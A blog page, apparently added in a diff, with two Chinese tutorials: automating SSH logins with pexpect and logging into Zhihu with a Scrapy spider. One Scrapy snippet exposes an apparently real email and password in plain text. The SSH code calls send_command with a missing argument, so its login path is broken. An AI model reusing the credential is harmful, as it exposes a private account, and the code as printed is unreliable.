+    def __init__(self,command,args=[],timeout=30,maxread=2000,\
+    searchwindowsize=None, logfile=None, cwd=None, env=None)
+</code></pre>
+
+<p>spawn是Pexpect模块主要的类，用以实现启动子程序，它有丰富的方法与子程序交互从而实现用户对子程序的控制。它主要使用 pty.fork() 生成子进程，并调用 exec() 系列函数执行 command 参数的内容。</p></li>
+<li><p><code>spawn()</code>类中的<code>expect()</code>函数:</p>
+
+<pre><code class="language-Python">expect(self, pattern, timeout=-1, searchwindowsize=None)
+</code></pre>
+
+<p>在参数中： pattern 可以是正则表达式， pexpect.EOF ， pexpect.TIMEOUT ，或者由这些元素组成的列表。需要注意的是，当 pattern 的类型是一个列表时，且子程序输出结果中不止一个被匹配成功，则匹配返回的结果是缓冲区中最先出现的那个元素，或者是列表中最左边的元素。使用 timeout 可以指定等待结果的超时时间 ，该时间以秒为单位。当超过预订时间时， expect 匹配到pexpect.TIMEOUT。</p></li>
+<li><p><code>spawn()</code>类中的<code>before</code>和<code>after</code>属性:</p>
+
+<p>expect 不断从读入缓冲区中匹配目标正则表达式，当匹配结束时 pexpect 的 before 成员中保存了缓冲区中匹配成功处之前的内容， pexpect 的 after 成员保存的是缓冲区中与目标正则表达式相匹配的内容。</p>
+
+<pre><code class="language-Python">child = pexpect.spawn(&#39;/bin/ls /&#39;) 
+child.expect (pexpect.EOF) 
+print child.before
+</code></pre>
+
+<p>以上代码就是打印在根目录下面执行ls命令后的输出内容</p></li>
+<li><p><code>spawn()</code>类中的send系列函数:</p>
+
+<pre><code class="language-Python">send(self, s) 
+sendline(self, s=&#39;&#39;) 
+sendcontrol(self, char)
+</code></pre>
+
+<p>这些方法用来向子程序发送命令，模拟输入命令的行为。 与 send() 不同的是 sendline() 会额外输入一个回车符 ，更加适合用来模拟对子程序进行输入命令的操作。 当需要模拟发送 “Ctrl+c” 的行为时，还可以使用 sendcontrol() 发送控制字符。</p>
+
+<pre><code class="language-Python">child.sendcontrol(&#39;c&#39;)
+
+</code></pre></li>
+</ol>
+
+<h5 id="toc_1">功能模块分解</h5>
+
+<ol>
+<li><p>首先我们需要一个可以单独的session会话，可以由connect函数创建指定host,username和password的会话子进程</p>
+
+<pre><code>```Python
+PROMPT = [&#39;#&#39;,&#39;$&#39;,&#39;&gt;&#39;,&#39;\$&#39;,&#39;&gt;&gt;&gt;&#39;]
+def createChildSession(host,username,password):
+    command = &#39;ssh &#39;+username+&#39;@&#39;+host
+    child = pexpect.spawn(command)
+    ret = child.expect([pexpect.TIMEOUT,&#39;Are you sure you want to continue connecting&#39;,&#39;[P|p]assword&#39;]+PROMPT)
+    if ret == 0:
+        print(&#39;[-] Error Connecting&#39;)
+        return
+    if ret == 1:
+        child.sendline(&#39;yes&#39;)
+        ret = child.expect([pexpect.TIMEOUT,&#39;[p|P]assword&#39;])
+        if ret == 0:
+            print(&#39;[-] Error Connecting&#39;)
+            return
+        if ret == 1:
+            send_command(password)
+            return
+    if ret == 2:
+        send_command(password)
+        return
+    return child
+```
+利用spawn创建会话之后,利用expect匹配可能存在的返回结果,如果匹配&#39;Are you sure you want to continue connecting&#39; 说明需要确认认证信息，如果直接返回password或者Password`这里利用[p|P]assword正则来匹配`,说明需要输入密码,如果直接是PROMPT中存在的字符，说明直接登录上去了。
+</code></pre></li>
+<li><p>一个单独的执行命令的函数:</p>
+
+<pre><code class="language-Python">def send_command(child,cmd):
+    child.sendline(cmd)
+    child.expect(PROMPT)
+    print(child.before)
+</code></pre>
+
+<p>一旦通过验证,我们就可以用上面的command函数在ssh会话中发送命令，然后等待命令提示符的出现，最后将命令的执行结果通过child.before打印出来。</p></li>
+<li><p>一个包含参数解析的main函数:</p>
+
+<pre><code class="language-Python">def main():
+    parse = optparse.OptionParser(&#39;Usage %prog -H &lt;host&gt; -u &lt;username&gt; -p &lt;password&gt; -c &lt;command&gt;&#39;)
+    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify the host&#39;)
+    parse.add_option(&#39;-u&#39;,dest=&#39;username&#39;,type=&#39;string&#39;,help=&#39;specify the username&#39;)
+    parse.add_option(&#39;-p&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify the password&#39;)    
+    parse.add_option(&#39;-c&#39;,dest=&#39;command&#39;,type=&#39;string&#39;,help=&#39;specify the command&#39;)
+
+    (options,args)=parse.parse_args()
+    host = options.host
+    username = options.username
+    password = options.password
+    command = options.command
+
+    session = createChildSession(host,username,password)
+    send_command(session,command)
+</code></pre>
+
+<p>optparse是一个用来给你的代码添加各种命令参数的库，用其解析出输入的host,username,password已经command,然后调用创建session会话，最后利用send_command向此session发送命令</p></li>
+</ol>
+
+<pre><code class="language-Bash">tianxianggendeiMac:Python-Study Apple$ python ssh.py -H pi.****.com -u root -p ***** -c pwd
+</code></pre>
+
+<p>输出:</p>
+
+<pre><code class="language-Bash"> pwd
+/root
+root@raspberrypi:~
+</code></pre>
+
+<h5 id="toc_2">完整代码</h5>
+
+<pre><code class="language-Python">#!/usr/bin/python
+#-*-coding:utf-8-*-
+# date:2016-6-21
+# author:root
+# 利用pexpect模拟ssh登陆
+
+import pexpect
+import optparse
+
+PROMPT = [&#39;#&#39;,&#39;$&#39;,&#39;&gt;&#39;,&#39;\$&#39;,&#39;&gt;&gt;&gt;&#39;]
+
+def send_command(child,cmd):
+    child.sendline(cmd)
+    child.expect(PROMPT)
+    print(child.before)
+
+def createChildSession(host,username,password):
+    command = &#39;ssh &#39;+username+&#39;@&#39;+host
+    child = pexpect.spawn(command)
+    ret = child.expect([pexpect.TIMEOUT,&#39;Are you sure you want to continue connecting&#39;,&#39;[P|p]assword&#39;]+PROMPT)
+    if ret == 0:
+        print(&#39;[-] Error Connecting&#39;)
+        return
+    if ret == 1:
+        child.sendline(&#39;yes&#39;)
+        ret = child.expect([pexpect.TIMEOUT,&#39;[p|P]assword&#39;])
+        if ret == 0:
+            print(&#39;[-] Error Connecting&#39;)
+            return
+        if ret == 1:
+            send_command(password)
+            return
+    if ret == 2:
+        send_command(password)
+        return
+    return child
+
+def main():
+    parse = optparse.OptionParser(&#39;Usage %prog -H &lt;host&gt; -u &lt;username&gt; -p &lt;password&gt; -c &lt;command&gt;&#39;)
+    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify the host&#39;)
+    parse.add_option(&#39;-u&#39;,dest=&#39;username&#39;,type=&#39;string&#39;,help=&#39;specify the username&#39;)
+    parse.add_option(&#39;-p&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify the password&#39;)    
+    parse.add_option(&#39;-c&#39;,dest=&#39;command&#39;,type=&#39;string&#39;,help=&#39;specify the command&#39;)
+
+    (options,args)=parse.parse_args()
+    host = options.host
+    username = options.username
+    password = options.password
+    command = options.command
+    
+    session = createChildSession(host,username,password)
+    send_command(session,command)
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2016-05-30T19:12:12+08:00" itemprop="datePublished">2016/5/30</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='python.html'>Python</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="14945011328774.html" itemprop="url">
+		Scrapy模拟登陆知乎</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p><img src="https://pic.mylonly.com/2016-06-29_14645998164473.jpg" alt="2016-06-29_14645998164473.jpg"/><br/>
+感谢简书作者<code>Andrew_liu</code>提供的思路,虽然知乎改版后，该文章上提供的方法已经失效<a href="http://www.jianshu.com/p/b7f41df6202d">Python爬虫(七)--Scrapy模拟登录<br/>
+</a></p>
+
+<p>利用Scrapy提供的cookie中间价很容易做到网页的模拟登陆,下面就来介绍怎么利用这个cookie中间件来登陆知乎。</p>
+
+<h3 id="toc_0">前期分析工作</h3>
+
+<ul>
+<li><p>打开<a href="https://www.zhihu.com,%E5%88%A9%E7%94%A8Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84Debug%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%AE%9A%E4%BD%8D%E5%88%B0%E7%99%BB%E9%99%86%E6%A1%86%E6%89%80%E5%9C%A8%E7%9A%84%E4%BD%8D%E7%BD%AE%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA">https://www.zhihu.com,利用Chrome浏览器的Debug功能，定位到登陆框所在的位置，如下图所示</a><br/>
+<img src="https://pic.mylonly.com/2016-06-29_14645980407304.jpg" alt="2016-06-29_14645980407304.jpg"/><br/>
+利用scrapy提供的xpath能很方便的获取到这个值(//div[@data-za-module=&quot;SignInForm&quot;]//form//input[@name=&quot;_xsrf&quot;]/@value&#39;)</p></li>
+<li><p>选中Debug窗口的Network选项，同时在输完账号密码后点击登陆，获取登陆操作后的post请求，见下图:</p></li>
+</ul>
+
+<p><img src="https://pic.mylonly.com/2016-06-29_14645982403637.jpg" alt="2016-06-29_14645982403637.jpg"/><br/>
+点击这个链接，确认这个链接就是提交登陆的url<br/>
+<img src="https://pic.mylonly.com/2016-06-29_14645983258011.jpg" alt="2016-06-29_14645983258011.jpg"/><br/>
+从FormData里面可以看到<a href="https://www.zhihu.com/email/login%E5%B0%B1%E6%98%AF%E7%99%BB%E9%99%86POST%E8%AF%B7%E6%B1%82%E7%9A%84url%EF%BC%8C%E9%9C%80%E8%A6%81%E6%8F%90%E4%BA%A44%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E5%85%B6%E4%B8%AD_xsrf%E5%B0%B1%E6%98%AF%E9%A6%96%E9%A1%B5%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9A%84%E9%9A%90%E8%97%8F%E8%A1%A8%E5%8D%95%E5%8F%82%E6%95%B0%EF%BC%8Cremember_me%E6%98%AF%E6%98%AF%E5%90%A6%E8%AE%B0%E4%BD%8Fcookie%E7%9A%84%E5%BC%80%E5%85%B3%EF%BC%8Cemail%E5%92%8Cpassword%E5%AF%B9%E5%BA%94%E8%B4%A6%E5%8F%B7%E5%92%8C%E5%AF%86%E7%A0%81">https://www.zhihu.com/email/login就是登陆POST请求的url，需要提交4个参数，其中_xsrf就是首页可以获取到的隐藏表单参数，remember_me是是否记住cookie的开关，email和password对应账号和密码</a></p>
+
+<blockquote>
+<p>此处可能有不一样的地方，因为我的知乎账号是email注册的，根据这个url的特征推测别的账号类型可能存在不一样的Url</p>
+</blockquote>
+
+<h3 id="toc_1">编写蜘蛛代码</h3>
+
+<p>1.继承CrawlSpider,并重写spider的start_request方法，让spier先访问登录页再去爬取start_urls中的链接，在start_requests方法中，让spider先去访问知乎首页，去获取隐藏的表单项<code>_xsrf</code></p>
+
+<pre><code class="language-Python">def start_requests(self):
+        return [Request(&quot;https://www.zhihu.com/&quot;,headers = self.headers,meta={&quot;cookiejar&quot;:1},callback=self.post_login)]
+</code></pre>
+
+<p>其中header需要自定义，因为知乎对spider做了限制，应该是检测User-Agent，你可以在setting.py中更改spider的默认UserAgent,也可以像我这样自己自定义一个</p>
+
+<pre><code class="language-Pythoh">headers = {
+    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;,
+    &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot;,
+    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.8,zh-TW;q=0.6,zh;q=0.4&quot;,
+    &quot;Connection&quot;: &quot;keep-alive&quot;,
+    &quot;Content-Type&quot;:&quot; application/x-www-form-urlencoded; charset=UTF-8&quot;,
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36&quot;,
+    &quot;Referer&quot;: &quot;http://www.zhihu.com&quot;
+}
+</code></pre>
+
+<p>meta中的cookiejar是Scrapy的Cookie中间件的关键字，具体可参考scrapy文档，这里因为只需要保存一个cookie，所以直接写1(注意:<code>并不是1个cookie才写的1，仅仅是个key，后面通过这个1这个key找到cookiejar中保存的cookie</code>)</p>
+
+<p>2.解析首页内容，获取到_xsrf的值，同时提交登录请求:</p>
+
+<pre><code class="language-Python">def post_login(self,response):
+        self.log(&quot;preparing login...&quot;)
+        xsrf = Selector(response).xpath(&#39;//div[@data-za-module=&quot;SignInForm&quot;]//form//input[@name=&quot;_xsrf&quot;]/@value&#39;).extract()[0]
+        self.log(xsrf)
+        return FormRequest(&quot;https://www.zhihu.com/login/email&quot;,meta={&#39;cookiejar&#39;:1},
+                                          headers = self.headers,
+                                          formdata = {
+                                             &#39;_xsrf&#39;:xsrf,
+                                             &#39;password&#39;:&#39;xgBKQTx7VnVLK9tv&#39;,
+                                             &#39;email&#39;:&#39;tianxianggen@gmail.com&#39;,
+                                             &#39;remember_me&#39;:&#39;true&#39;,
+                                          },
+                                          callback = self.after_login,
+                                          )
+</code></pre>
+
+<ol>
+<li>将登录成功后获取到的cookie传递给每一个start_urls中链接的ruquest</li>
+</ol>
+
+<pre><code class="language-Python">def after_login(self,response):
+        for url in self.start_urls:
+            yield Request(url,meta={&#39;cookiejar&#39;:1},headers = self.headers)
+</code></pre>
+
+<p>4.由于cookiejar中的cookie并不会自动发送给每个链接，因此在urls通过Rule获取到的连接，也是需要我们手动将cookie加上，通过Rule提供的process_request参数重新创建带cookie的Request</p>
+
+<pre><code class="language-Pythoh">rules = (
+        Rule(SgmlLinkExtractor(allow=(&#39;/question/\d*&#39;)),process_request=&quot;request_question&quot;),
+    )
+</code></pre>
+
+<p>同时提供request_question函数</p>
+
+<pre><code class="language-Python">def request_question(self,request):
+        return Request(request.url,meta={&#39;cookiejar&#39;:1},headers = self.headers,callback=self.parse_question)
+</code></pre>
+
+<p>5.由于已经有了process_link ,Rule中的callback参数就不再起作用了，而是调用新构造的Request中的callback函数。</p>
+
+<pre><code class="language-Python">def parse_question(self,response):
+        sel = Selector(response)
+        item = zhihuItem()
+        item[&#39;qestionTitle&#39;] = sel.xpath(&quot;//div[@id=&#39;zh-question-title&#39;]//h2/text()&quot;).extract_first()
+        item[&#39;image_urls&#39;] = sel.xpath(&quot;//img[@class=&#39;origin_image zh-lightbox-thumb lazy&#39;]/@data-original&quot;).extract()
+        return item
+</code></pre>
+
+<blockquote>
+<p>这个parse_question方法仅仅是获取问题名称和问题下面的所有图片链接。</p>
+</blockquote>
+
+<h3 id="toc_2">完整代码</h3>
+
+<pre><code class="language-Python">import urllib2
+import os
+import re
+import codecs
+
+
+from scrapy.contrib.spiders import CrawlSpider,Rule
+from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
+from scrapy.selector import Selector
+from MySpider.items import zhihuItem
+from scrapy.http import Request
+from scrapy.http import FormRequest
+from scrapy.utils.response import open_in_browser
+
+
+class zhihuSpider(CrawlSpider):
+    name = &quot;zhihu&quot;
+    allow_domians = [&quot;zhihu.com&quot;]
+    start_urls = [&quot;https://www.zhihu.com/collection/38624707&quot;]
+    rules = (
+        Rule(SgmlLinkExtractor(allow=(&#39;/question/\d*&#39;)),process_request=&quot;request_question&quot;),
+    )
+    
+    headers = {
+    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;,
+    &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot;,
+    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.8,zh-TW;q=0.6,zh;q=0.4&quot;,
+    &quot;Connection&quot;: &quot;keep-alive&quot;,
+    &quot;Content-Type&quot;:&quot; application/x-www-form-urlencoded; charset=UTF-8&quot;,
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36&quot;,
+    &quot;Referer&quot;: &quot;http://www.zhihu.com&quot;
+    }
+    
+    def start_requests(self):
+        return [Request(&quot;https://www.zhihu.com/&quot;,headers = self.headers,meta={&quot;cookiejar&quot;:1},callback=self.post_login)]
+        
+    def post_login(self,response):
+        self.log(&quot;preparing login...&quot;)
+        xsrf = Selector(response).xpath(&#39;//div[@data-za-module=&quot;SignInForm&quot;]//form//input[@name=&quot;_xsrf&quot;]/@value&#39;).extract()[0]
+        self.log(xsrf)
+        return FormRequest(&quot;https://www.zhihu.com/login/email&quot;,meta={&#39;cookiejar&#39;:response.meta[&#39;cookiejar&#39;]},
+                                          headers = self.headers,
+                                          formdata = {
+                                             &#39;_xsrf&#39;:xsrf,
+                                             &#39;password&#39;:&#39;差点就忘了删了&#39;,
+                                             &#39;email&#39;:&#39;邮箱也不能暴露&#39;,
+                                             &#39;remember_me&#39;:&#39;true&#39;,
+                                          },
+                                          callback = self.after_login,
+                                          )
+                                                      
+    def after_login(self,response):
+        for url in self.start_urls:
+            yield Request(url,meta={&#39;cookiejar&#39;:1},headers = self.headers)
+   
+    def request_question(self,request):
+        return Request(request.url,meta={&#39;cookiejar&#39;:1},headers = self.headers,callback=self.parse_question)
+        
+    def parse_question(self,response):
+        sel = Selector(response)
+        item = zhihuItem()
+        item[&#39;qestionTitle&#39;] = sel.xpath(&quot;//div[@id=&#39;zh-question-title&#39;]//h2/text()&quot;).extract_first()
+        item[&#39;image_urls&#39;] = sel.xpath(&quot;//img[@class=&#39;origin_image zh-lightbox-thumb lazy&#39;]/@data-original&quot;).extract()
+        return item
+</code></pre>
+
+
+			
+			
+		</div>
+
+	</article>
+  
+
+</div>
+<nav id="pagenavi">
+	 
+	 <a class="next" href="python_1.html">Next</a> 
+	<div class="center"><a href="archives.html">Blog Archives</a></div>
+
+</nav>
+
+</div>
+
+
+
+        </div>
+			<footer id="footer" class="inner">Copyright &copy; 2014
+Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a> &nbsp;&nbsp; 
+Theme by <a href="http://shashankmehta.in/archive/2012/greyshade.html">Shashank Mehta</a>
+      </footer>
+		</div>
+	</div>
+
+  
+    
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?6d4f2f6760a5d2778c062a1a7df8c960";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
